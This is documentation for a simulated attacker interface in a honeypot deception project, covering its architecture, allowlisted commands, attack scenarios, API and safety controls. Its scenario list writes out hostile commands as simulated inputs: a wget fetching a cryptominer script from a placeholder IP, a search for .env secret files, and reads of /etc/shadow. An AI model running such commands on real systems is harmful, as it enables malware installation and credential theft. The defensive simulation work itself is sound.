# Phase 6 — Linux Attacker Simulator UI Documentation

## 1. Overview and Architecture

The **Linux Attacker Simulator** is a dedicated browser interface designed to simulate attacker interactions against the AI Adaptive Cyber Deception honeypot environment.

It serves as a controlled, safe simulation harness for demonstrating how attacker actions are detected by the deterministic behaviour analysis engine (Phase 2) and how the policy engine dynamically triggers adaptive deception responses in the fictional world state (Phase 3).

### Architecture & Request Flow

```
   ┌───────────────────────────────────────────────────────────────┐
   │              Linux Attacker Simulator (Browser)               │
   │  - Interactive Shell Terminal (Simulated output)              │
   │  - Quick Attack Action Controls (Recon, Auth, PrivEsc, etc.)  │
   │  - Live Threat Score & Deception Response Panel               │
   └───────────────────────────────┬───────────────────────────────┘
                                   │
                                   │ HTTP POST /api/simulator/command
                                   │ or /api/simulator/action
                                   ▼
   ┌───────────────────────────────────────────────────────────────┐
   │                  FastAPI Backend (Port 8000/8001)             │
   │                  simulator/routes.py & engine.py              │
   └───────────────────────────────┬───────────────────────────────┘
                                   │
             ┌─────────────────────┴──────────────────────┐
             ▼                                            ▼
   ┌────────────────────┐                       ┌──────────────────┐
   │ In-Memory Terminal │                       │ Cowrie Normalized│
   │ Output Generator   │                       │ Event Synthesis  │
   └────────────────────┘                       └─────────┬────────┘
             │                                            │
             │                                            ▼
             │                                  ┌──────────────────┐
             │                                  │ Analysis Engine  │
             │                                  │ (Features/Rules) │
             │                                  └─────────┬────────┘
             │                                            │
             │                                            ▼
             │                                  ┌──────────────────┐
             │                                  │ Deception Engine │
             │                                  │ & WorldState     │
             │                                  └─────────┬────────┘
             │                                            │
             ▼                                            ▼
   ┌───────────────────────────────────────────────────────────────┐
   │ Combined Response (Terminal Output + Telemetry + Deception)   │
   └───────────────────────────────────────────────────────────────┘
```

---

## 2. Supported Simulation Commands & Actions

### A. Terminal Commands Allowlist
All terminal interactions are strictly validated against an in-memory allowlist. Commands operate on synthetic templates and fictional `WorldState` assets; **no operating system shells or subprocesses are ever invoked**.

| Command | Category | Description | Simulated Output |
|---|---|---|---|
| `help` | Informational | Lists available simulation commands | Command usage guide |
| `whoami` | Reconnaissance | Returns current simulated user | `root` |
| `hostname` | Reconnaissance | Returns simulated honeypot hostname | `corp-srv-db01` |
| `pwd` | Reconnaissance | Returns working directory | `/root` |
| `uname [-a]` | Reconnaissance | Returns kernel/OS metadata | `Linux corp-srv-db01 5.15.0-88 x86_64` |
| `id` | Reconnaissance | Returns UID/GID details | `uid=0(root) gid=0(root) groups=0(root)` |
| `ip addr` / `ifconfig` | Reconnaissance | Returns simulated network interfaces | `eth0: 192.0.2.10/24` |
| `ps [aux]` | Reconnaissance | Returns simulated process table | Running daemons (`sshd`, `nginx`, `init`) |
| `ls [path]` | File Discovery | Lists simulated directories | Fictional files + dynamically revealed decoys |
| `cat <path>` | File / Credential | Reads fictional files (`/etc/passwd`, `/etc/shadow`, decoys) | Fictional credential text / decoy contents |
| `exit` | Session | Closes connection | `logout` |

*Note: Any unsupported command (e.g. `rm`, `curl`, `powershell`, arbitrary executables) produces a safe informational message: `bash: <cmd>: command not supported in simulation environment.`*

### B. High-Level Attack Actions (One-Click Scenarios)

1. **Reconnaissance**: Executes `whoami`, `uname -a`, `hostname`, `id`, and `ifconfig`. Triggers policy `POL-RECON-REVEAL-MYSQL`, revealing the internal MySQL database service.
2. **Authentication Spray (5x)**: Simulates 5 failed SSH authentication attempts across administrative accounts (`admin`, `root`, `test`, `guest`, `deploy`). Triggers `POL-AUTH-SPRAY-MONITOR`, recording attacker interest in credential spraying.
3. **File Discovery**: Simulates `ls -la /var/www`, `find / -name "*.env"`, and `locate backup`. Triggers `POL-FILE-DISC-DB-DUMP`, presenting decoy database dump `/home/backup/db_dump.sql`.
4. **Download Attempt**: Simulates `wget http://192.0.2.99/miner.sh -O /tmp/miner.sh`. Triggers `POL-DOWNLOAD-DECOY-ENV`, presenting decoy configuration secrets `/var/www/internal/.env`.
5. **Privilege Escalation**: Simulates credential file inspection (`cat /etc/passwd`, `cat /etc/shadow`). Triggers `POL-CRED-DECOY-SSH`, presenting decoy administrative private key `/root/.ssh/id_rsa_backup`.
6. **Benign Activity**: Simulates routine health check commands (`date`, `echo 'system health check'`). Triggers `POL-DEFAULT-NOOP` (`no_op`).

---

## 3. Dynamic Deception Feedback Loop

The simulator demonstrates live deception feedback:
1. When a user runs a privilege escalation action or enters `cat /etc/shadow`, the Phase 2 analysis engine fires rule `PE-02`.
2. The Phase 3 deception engine fires policy `POL-CRED-DECOY-SSH`, transitioning the decoy file `/root/.ssh/id_rsa_backup` from hidden to visible.
3. If the user subsequently enters `ls /root/.ssh` in the simulated terminal, `id_rsa_backup` now appears in the directory listing.
4. If the user enters `cat /root/.ssh/id_rsa_backup`, the terminal displays the decoy key material.

---

## 4. How to Start and Run the Simulator

### Option 1: Unified Access (Both Dashboard & Simulator on Port 8000)
The simulator is mounted directly inside the existing Phase 5 application:

```bash
# Windows / PowerShell
python dashboard/server.py --host 127.0.0.1 --port 8000

# Linux / Ubuntu
python3 dashboard/server.py --host 127.0.0.1 --port 8000
```
- **Ubuntu Analysis Dashboard**: `http://127.0.0.1:8000/`
- **Linux Attacker Simulator**: `http://127.0.0.1:8000/simulator/`

### Option 2: Standalone Simulator Server (Simulating Attacker VM on Port 8001)
```bash
# Windows / PowerShell
python simulator/server.py --host 127.0.0.1 --port 8001

# Linux / Ubuntu
python3 simulator/server.py --host 127.0.0.1 --port 8001
```
- Access at: `http://127.0.0.1:8001/`

### Stopping the Server
Press `Ctrl + C` in the running terminal.

---

## 5. REST API Reference

| Endpoint | Method | Payload | Description |
|---|---|---|---|
| `/api/simulator/health` | `GET` | None | Returns simulator status, active session, and supported commands/actions. |
| `/api/simulator/state` | `GET` | None | Returns active session state, events history, latest analysis & deception decisions, and world state. |
| `/api/simulator/command` | `POST` | `{"command": str}` | Executes a simulated shell command from the allowlist. |
| `/api/simulator/action` | `POST` | `{"action": str}` | Triggers a predefined scenario action sequence. |
| `/api/simulator/session/new`| `POST` | `{}` | Initializes a fresh session ID and clears session event history. |
| `/api/simulator/reset` | `POST` | `{}` | Clears session events and restores fictional `WorldState` to baseline. |

---

## 6. Safety Boundaries & Security Controls

1. **Zero Subprocess / OS Execution**: Neither user command strings nor action sequences are passed to `os.system`, `subprocess`, shell interpreters, or PowerShell.
2. **Zero Host Filesystem Modifications**: Decoy files and simulated directories exist exclusively in memory within Python objects. No files on the real host disk are created or modified.
3. **No Network Sockets**: Commands like `wget` or `ifconfig` produce static simulated text; no network sockets are opened to external IP addresses.
4. **Persistent Visual Safety Indicator**: The simulator UI prominently displays the banner:
   `SIMULATION ONLY — NO REAL ATTACKS EXECUTED — STRICTLY IN-MEMORY ENVIRONMENT`.
